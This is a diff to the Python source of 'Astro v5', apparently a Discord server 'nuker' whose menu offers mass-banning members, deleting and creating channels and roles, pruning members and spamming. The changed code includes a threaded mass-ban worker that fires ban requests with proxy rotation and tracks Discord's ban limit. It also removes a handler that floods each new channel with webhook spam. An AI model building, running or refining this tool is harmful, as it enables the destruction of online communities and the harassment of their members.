@@ -34,10 +34,13 @@ class astro:
                                           ███    █▀   ▄████████▀     ▄████▀     ███    ███  ▀██████▀
                                                                                 ███    ███
 
-	                              [1] - massban ids                         [2] - massban scraped
-        	                      [3] - delete channels                     [4] - create channels
-                	              [5] - delete roles                        [6] - create roles
-                        	      [7] - prune members                       [8] - spam server (UNFINISHED)
+                                                                  choices:
+                                     ╔═════════════════════════════════════════════════════════════════╗
+	                             ║ [1] - massban ids                         [2] - massban scraped ║
+        	                     ║ [3] - delete channels                     [4] - create channels ║
+                	             ║ [5] - delete roles                        [6] - create roles    ║
+                        	     ║ [7] - prune members                       [8] - soon...         ║
+                                     ╚═════════════════════════════════════════════════════════════════╝
 > astro.cybin.cc
 > made by horrid
 
@@ -62,7 +65,7 @@ class astro:
                                                                     Log:
 '''
     menu = f'''
-                                                              - Astro v5 -
+                                                                - Astro v5 -
                                                      ___
                                                   ,o88888
                                                ,o8888888'
@@ -85,11 +88,13 @@ class astro:
          .. . ."'
         .
 
-
-                                    [1] - massban ids                         [2] - massban scraped
-                                    [3] - delete channels                     [4] - create channels
-                                    [5] - delete roles                        [6] - create roles
-                                    [7] - prune members                       [8] - spam server (UNFINISHED) 
+                                                                  choices:
+                                     ╔═════════════════════════════════════════════════════════════════╗
+	                             ║ [1] - massban ids                         [2] - massban scraped ║
+        	                     ║ [3] - delete channels                     [4] - create channels ║
+                	             ║ [5] - delete roles                        [6] - create roles    ║
+                        	     ║ [7] - prune members                       [8] - soon...         ║
+                                     ╚═════════════════════════════════════════════════════════════════╝
 
 > astro.cybin.cc
 > made by horrid
@@ -102,7 +107,7 @@ class astro:
 
 '''
     logo = f'''
-                                                              - Astro v5 -
+                                                                - Astro v5 -
                                                      ___
                                                   ,o88888
                                                ,o8888888'
@@ -169,6 +174,26 @@ class astro:
     jsonparamrole = {"name": random.choice(rolenames)}
     spamparam = {"content": random.choice(whookcontents)}
     whookparam = {"name": random.choice(whookusers)}
+
+    def massbansend():
+        try:
+            while True:
+                req, url, headers = astro.q.get()
+                p = open("proxies.txt", "r")
+                pr = p.readlines()
+                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+                s = req(url, headers=headers)
+                print(s.status_code)
+                astro.count += 1
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
+                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
+                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
+                astro.q.task_done()
+        except Exception as err:
+            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+            else:
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
     def chandelreqsend():
         try:
@@ -241,27 +266,6 @@ class astro:
                 print(err)
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
-    def massbansend():
-        try:
-            while True:
-                req, url, headers = astro.q.get()
-                p = open("proxies.txt", "r")
-                pr = p.readlines()
-                proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers)
-                print(s.status_code)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
-                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
-                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
-                    for i in range(50):
-                        input()
-                astro.q.task_done()
-        except Exception as err:
-            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
-            else:
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
     def chandelsend():
         try:
@@ -520,16 +524,6 @@ class astro:
                 exit()
             except:
                 exit()
-
-@client.event
-async def on_guild_channel_create(channel):
-    try:
-       webhook = await channel.create_webhook(name=random.choice(astro.whookusers))
-       for i in range(100):
-           print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - send message to webhook", 1))
-           await webhook.send(random.choice(astro.whookcontents))
-    except Exception:
-      pass
 
 if __name__ == "__main__":
     try:
